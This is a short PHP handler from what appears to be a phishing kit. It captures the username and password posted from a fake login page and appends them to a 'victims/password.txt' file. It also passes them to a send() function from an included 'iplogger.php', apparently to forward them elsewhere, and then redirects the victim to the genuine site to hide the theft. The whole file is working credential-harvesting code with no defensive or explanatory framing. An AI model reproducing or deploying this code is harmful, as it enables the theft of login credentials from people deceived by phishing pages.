<?php
include("iplogger.php");
$url;
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{		   
    $user_agent = $_SERVER['HTTP_USER_AGENT'];       
    $data = "====================================\n".
            "username:   " .$_POST['username']."\n".    
            "password:   " .$_POST['password']."\n".
            "====================================\n".   
	    "Page:     ||".$_POST['location']."||\n".                                                         
	    "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                                                          
		
    File_Put_Contents(".././victims/password.txt", $data, FILE_APPEND);                                      
    send($data);
    $url =	explode("||", $data)[1].".com";
    $url = 'https://www.'.$url;	
}
//if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
//else 
//echo "<script>window.location.assign('$url')</script>";
 header('Location:' .$url);
?>
